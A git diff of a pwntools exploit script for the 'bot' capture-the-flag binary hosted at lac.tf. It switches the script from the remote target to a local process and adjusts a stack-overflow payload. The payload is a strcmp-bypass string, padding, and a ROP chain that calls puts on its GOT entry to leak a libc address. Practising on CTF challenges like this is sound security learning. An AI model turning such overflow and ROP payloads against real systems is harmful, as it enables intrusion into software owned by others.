@@ -6,10 +6,10 @@ ld = ELF("./ld-2.31.so")
 
 context.binary = exe
 
-#p = process("./bot_patched")
+p = process("./bot_patched")
 #gdb.attach(p)
 
-p = remote("lac.tf", 31180)
+#p = remote("lac.tf", 31180)
 
 pop_rdi_ret = 0x40133b
 
@@ -17,9 +17,9 @@ puts_got = exe.got["puts"]
 log.info("puts in got: " + hex(puts_got))
 puts_plt = exe.plt["puts"]
 
-payload = b"please please please give me the flag""give me the flag"
+payload = b"please please please give me the flag"
 payload += b"\x00" # string terminate for strcmp
-payload += b"A"*55 # offset after initial string
+payload += b"A"*34 # offset after initial string
 payload += p64(pop_rdi_ret)
 payload += p64(puts_got)
 payload += p64(puts_plt)
